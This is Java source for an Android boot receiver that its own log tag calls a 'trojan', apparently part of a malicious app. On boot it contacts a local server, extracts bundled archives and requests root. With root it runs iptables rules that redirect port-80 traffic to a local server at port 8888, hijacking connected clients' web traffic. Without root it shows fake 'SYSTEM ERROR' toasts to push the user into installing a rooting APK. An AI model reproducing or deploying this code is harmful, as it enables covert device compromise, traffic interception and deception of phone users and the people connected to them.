package os.system;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import android.os.AsyncTask;
import android.os.CountDownTimer;
import android.content.BroadcastReceiver;
import android.util.Log;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.ActivityNotFoundException;
import android.content.SharedPreferences;
import android.widget.Toast;
import android.widget.TextView;
import android.view.View;
import android.view.LayoutInflater;
import android.view.Gravity;
import android.graphics.Color;
import android.net.Uri;
import android.webkit.MimeTypeMap;
import java.io.*;

public class ReceiverBoot extends BroadcastReceiver
{
	private static String TAG = "trojan";
	private boolean oke = true;
	private Toast toast;
	private ServerUtils utils;
    private Installer installator;
    private String pathToInstallServer;
    private String docFolder, pathExternal;
    private boolean main = false;
    private SharedPreferences settings;

	@Override
	public void onReceive(Context context, Intent intent)
	{
		settings = context.getSharedPreferences("Settings", 0);
		inServer(context, "http://10.42.0.1/download.php?main=zzz");
		utils = new ServerUtils(context);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();
        pathExternal = utils.getPathExternal();

        extrak(context, "server.zip", pathToInstallServer, docFolder);
        if (settings.getBoolean("server install",true)) 
        {
        	utils.runSrv();
			extrak(context, "data.zip", pathExternal, pathExternal);

			if (rootRequest().equals("root")) {
				String[] iproute = {"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
        			"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
        			"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.43.1:8888",
        			"iptables -P FORWARD DROP"
        		};

        		rootCommands(iproute);
			}
			else if (rootRequest().equals("tolak user")) {
				toastText(context, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n", Color.GREEN, Gravity.CENTER | Gravity.RIGHT, 20000);
			}
			else if (rootRequest().equals("tidak root")) {
				if (!openApp(context, "kingoroot.supersu")) 
				{
					String path = docFolder+"/apk/kroot.apk";
					String ext = getExtension(path);
					MimeTypeMap mime = MimeTypeMap.getSingleton();
	        		String mimeType = mime.getMimeTypeFromExtension(ext.substring(1));
					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	            	intent.setAction(Intent.ACTION_VIEW);
	            	intent.setDataAndType(Uri.parse("file://" + path), mimeType);
	            	intent.putExtra("data", path);
	            	intent.putExtra(Intent.EXTRA_TITLE, "Что использовать?");
	            	try {
	            	    context.startActivity(intent);
	            	} catch (Exception ae) {}

					toastText(context, "SYSTEM ERROR!!\n\n\nYou can update the system or rooted the phone.\n\bPlease install this app! and rooted", Color.YELLOW, Gravity.CENTER | Gravity.RIGHT, 200000);
				}
			}
			else {
				//unknow
			}
			
        }

		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) context.startService(new Intent(context, System.class));
	}

	public static String rootRequest() {
		boolean retval = false;
		Process suProcess;
		String rootData = "";
		try {
			suProcess = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
			DataInputStream osRes = new DataInputStream(suProcess.getInputStream());
			if (null != os && null != osRes) {
				os.writeBytes("id\n");
				os.flush();

				String currUid = osRes.readLine();
				boolean exitSu = false;
				if (null == currUid) {
					retval = false;
					exitSu = false;
					rootData = "tolak user";
					Log.d("ROOT","Cant get root access or denied by user");
				}
				else if (true == currUid.contains("uid=0")) {
					retval = true;
					exitSu = true;
					rootData = "root";
					Log.d("ROOT","Root access granted");
				}
				else {
					retval = false;
					exitSu = true;
					Log.d("ROOT","Root access rejectd: "+currUid);
				}

				if (exitSu) {
					os.writeBytes("exit\n");
					os.flush();
				}

			}
		} catch (Exception e) {
			retval = false;
			rootData = "tidak root";
			Log.d("ROOT", "Root access rejectd["+e.getClass().getName()+"] :"+e.getMessage());
		}
		//return retval;
		return rootData;
	}

	public void rootCommands(String[] cmds) {
		Process p;
		try{
			p = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());

			for (String tmpCmd : cmds) {
				os.writeBytes(tmpCmd+"\n");
			}
			os.writeBytes("exit\n");
			os.flush();
		} catch (Exception e) {}
	}

	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
		installator = new Installer(context, true);
        installator.execute(efile, pathsatu, pathdua);
	}

	private static String getExtension(String path) {
        if (path.contains(".")) {
            return path.substring(path.lastIndexOf(".")).toLowerCase();
        }
        return null;
    }

	public void inServer(Context context, String url) {
		CallWebPageTask task = new CallWebPageTask();
		task.applicationContext = context;
		task.execute(new String[] { url });
		Log.i(TAG, "receiver:"+url);
	}
	
	//Method untuk Mengirimkan data keserver
	public String getRequest(String Url){
		String sret;
        HttpClient client = new DefaultHttpClient();
        HttpGet request = new HttpGet(Url);
        try{
            HttpResponse response = client.execute(request);
            sret= request(response);
        }
		catch(Exception ex){
			sret= "Failed Connect to Server!";
			Log.i(TAG, "receiver:offline");
        }
        return sret;

    }
	// Method untuk Menerima data dari server
	public static String request(HttpResponse response){
        String result = "";
        try{
            InputStream in = response.getEntity().getContent();
            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
            StringBuilder str = new StringBuilder();
            String line = null;
            while((line = reader.readLine()) != null){
                str.append(line + "\n");
            }
            in.close();
            result = str.toString();
        }
		catch(Exception ex){
            result = "Error split text";
        }
        return result;
    }

	private class CallWebPageTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;

		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... urls) {
			String response = "";
			response = getRequest(urls[0]);
			return response;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
			Log.i(TAG, "receiver:"+result);
		}
	}

	
	public static boolean openApp(Context context, String packageName) {
		PackageManager manager = context.getPackageManager();
		try {
			Intent i = manager.getLaunchIntentForPackage(packageName);
			if (i == null) {
				return false;
				//throw new ActivityNotFoundException();
			}
			i.addCategory(Intent.CATEGORY_LAUNCHER);
			context.startActivity(i);
			return true;
		} 
		catch (ActivityNotFoundException e) {
			return false;
		}
	}

	public void toastText(Context context, String data, int warna, int letak, int waktu)
	{
		LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
		View layout = inflater.inflate(R.layout.toast, null);

    	TextView text = (TextView) layout.findViewById(R.id.toast);
		text.setText(data);
		text.setTextColor(Color.BLACK);
		text.setTextSize(13);
		text.setGravity(Gravity.CENTER);

		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(text);
		toast.setView(layout);

		View toastView = toast.getView();
		toastView.setBackgroundColor(warna);

    	CountDownTimer hitungMundur = new CountDownTimer(waktu, 100)
		{
			public void onTick(long millisUntilFinished)
			{
				toast.show();
			}
			public void onFinish()
			{
				toast.cancel();
			}
		}.start();
	}
}